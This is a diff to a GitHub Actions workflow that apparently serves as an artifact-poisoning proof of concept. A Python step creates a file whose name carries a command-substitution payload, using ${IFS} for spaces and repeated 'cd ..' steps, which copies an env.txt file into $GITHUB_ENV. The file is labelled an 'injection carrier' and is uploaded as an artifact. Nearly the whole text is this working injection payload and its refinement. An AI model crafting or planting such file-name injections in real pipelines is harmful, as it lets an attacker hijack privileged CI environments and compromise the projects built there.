@@ -44,11 +44,12 @@ jobs:
           sed -i "s|PRNUM|$PRNUM|" content/p.js
           python3 - <<'PY'
           import os
-          inj = "$(cp${IFS}$(printf${IFS}'\\057')tmp$(printf${IFS}'\\057')content$(printf${IFS}'\\057')content$(printf${IFS}'\\057')env.txt${IFS}$GITHUB_ENV)"
+          ups = ";".join(["cd${IFS}.."] * 8)
+          inj = "$(" + ups + ";cd${IFS}tmp;cd${IFS}content;cd${IFS}content;cp${IFS}env.txt${IFS}$GITHUB_ENV)"
           name = "x" + inj + ".txt"
           with open(os.path.join("content", name), "w") as f:
               f.write("injection carrier\n")
-          print("created", name)
+          print("created", name, len(name))
           PY
           ls -la content
       - uses: actions/upload-artifact@v4
